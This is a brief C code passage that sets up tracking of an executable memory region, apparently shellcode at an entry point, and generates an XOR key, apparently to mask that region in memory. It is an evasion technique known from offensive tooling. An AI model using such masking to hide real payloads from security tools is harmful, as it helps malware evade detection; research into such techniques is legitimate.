    TrackedMemory tracked = {0};
    tracked.count = 1;
    tracked.sections[0].base             = ep;
    tracked.sections[0].size             = scSize;
    tracked.sections[0].original_protect = PAGE_EXECUTE_READ;
    GenerateXorKey(tracked.xor_key);
    printf("    Generated %d-byte XOR key\n", XOR_KEY_LEN);

    // save first 8 bytes for integrity check
